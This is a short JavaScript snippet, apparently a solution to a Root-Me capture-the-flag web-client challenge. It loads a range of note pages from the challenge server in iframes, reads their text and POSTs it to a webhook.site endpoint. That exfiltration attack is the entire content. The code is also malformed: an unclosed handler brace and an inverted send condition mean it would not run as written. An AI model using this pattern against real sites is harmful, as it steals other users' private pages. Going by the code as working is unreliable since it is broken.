<script>
const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
const WEBHOOK = "https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864";

function run(a = 2800, b = 2840) {
    let results = [];
    let loadedCount = 0;
    const total = b - a;

    for (let i = a; i < b; i++) {
        
        
        const iframe = document.createElement("iframe");
        iframe.src = TARGET + i;

        iframe.onload = () => {
            if (!iframe.contentDocument){
                loadedCount++;
                return;
            }
            results.push({
                id: i,
                data: iframe.contentDocument.documentElement.textContent
            });

            loadedCount++;

            if (loadedCount !== b - a){
                fetch(WEBHOOK, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(results)
                });
            };
        document.documentElement.appendChild(iframe);
    }
}

run();
</script>
